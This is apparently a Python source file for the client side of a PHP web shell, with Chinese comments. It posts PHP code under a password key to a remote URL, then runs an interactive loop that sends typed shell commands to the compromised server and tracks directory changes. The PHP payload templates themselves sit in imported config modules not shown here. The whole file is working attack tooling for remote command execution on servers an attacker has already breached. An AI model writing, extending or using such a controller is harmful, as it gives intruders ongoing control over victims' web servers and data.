import config.shellConfig as shellC
import config.fileConfig as fileC
import requests as res
class shellManager:

    def __init__(self,con):
        self.con = con

    def Begin(self):
        self.connect = self.con.getUrl()
        self.key = self.con.getKey()
        date = { self.key : self.getBaseCode() }
        re = res.session()
        firstURL=re.post(self.connect,date)
        print(firstURL.text)
        self.shellMain(re)
        re.close()

    def getBaseCode(self):
        baseCodeForFile=shellC.PHP_shellBaseCode
        #print(baseCodeForFile)
        return baseCodeForFile

    def check(self,text):
        if len(text)<2:
            print('缺少参数')
        return len(text)
    def path(self,re):
        getpath = fileC.PHP_GETPATH
        getpath = getpath.replace('@@',self.changePath(),1)
        date = { self.key : getpath }
        commit = re.post(self.connect,date)
        # print(commit.text)
        return commit.text

    def changePath(self):
        j = 0
        str = self.CHANGE_PATH[0]
        while j!=self.i:
            j = j + 1
            str = str + '/' + self.CHANGE_PATH[j]
        return fileC.PHP_CHDIR.replace('##',str,1)

    def shellMain(self,re):
        self.i = 0
        self.CHANGE_PATH = dict.fromkeys(range(1024),'.')
        while True:
            self.PATH = self.path(re)+" >"
            # print(PATH)
            flag = input(self.PATH)
            flag1= flag
            if len(flag) == 0:
                continue

            cmd = shellC.PHP_shellCode
            cmd = cmd.replace('@@',self.changePath(),1)
            cmd = cmd.replace('##',flag,1)
            date = { self.key : cmd }
            commit = re.post(self.connect,date)
            print(commit.text,"\n")

            if flag == 'exit':
                print('exit')
                flag == ''
                break
            flag1 = flag1.split()
            if flag1[0] == 'cd':
                if self.check(flag1)>1:
                    if flag1[1] != '.' and flag1[1] != '..':
                        self.i = self.i + 1
                        self.CHANGE_PATH[self.i] = flag1[1]
                        CD = fileC.PHP_CD.replace('@@',self.changePath(),1)
                        date = { self.key : CD }
                        commit = re.post(self.connect,date)
                        # print(commit.text)
                    elif flag1[1] != '.':
                        self.i = self.i - 1
                    continue
                else:
                    continue